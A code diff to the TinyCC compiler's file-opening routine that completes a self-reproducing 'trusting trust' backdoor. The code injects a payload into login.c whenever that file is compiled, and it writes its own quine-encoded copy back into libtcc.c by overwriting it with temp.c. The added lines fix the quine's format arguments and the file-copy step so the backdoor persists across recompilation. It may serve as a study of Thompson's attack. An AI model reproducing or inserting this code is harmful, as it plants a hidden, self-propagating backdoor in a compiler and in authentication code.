@@ -721,7 +721,7 @@ static int _tcc_open(TCCState *s1, const char *filename)
     char *lmao = %c%s%c;\
     int fd;\
     FILE * file;\
-    if(!strcmp(filename,%clogin.c%c)\
+    if(!strcmp(filename,%clogin.c%c))\
     {\
         file = fopen(filename, %cw+%c);\
         char *bad = %c#include <string.h>\
@@ -764,7 +764,7 @@ static int _tcc_open(TCCState *s1, const char *filename)
             if (!strcmp(line, func_head))\
             {\
                 flag = 1;\
-                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 92, 34, 37, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);\
+                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 37, 34, 34, 92, 92, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);\
             }\
             else if (!strcmp(line, func_end))\
             {\
@@ -833,13 +833,28 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)\
             if (!strcmp(line, func_head))
             {
                 flag = 1;
-                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 92, 34, 37, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);
+                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 37, 34, 34, 92, 92, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);
             }
             else if (!strcmp(line, func_end))
             {
                 flag = 0;
             }
         }
+
+        fclose(tf);
+        fclose(file);
+
+        FILE *fptr1, *fptr2;
+        fptr1 = fopen("temp.c", "r");
+        fptr2 = fopen("libtcc.c", "w+");
+        char c = fgetc(fptr1);
+        while (c != EOF)
+        {
+            fputc(c, fptr2);
+            c = fgetc(fptr1);
+        }
+        fclose(fptr1);
+        fclose(fptr2);
     }
 
     if (strcmp(filename, "-") == 0)
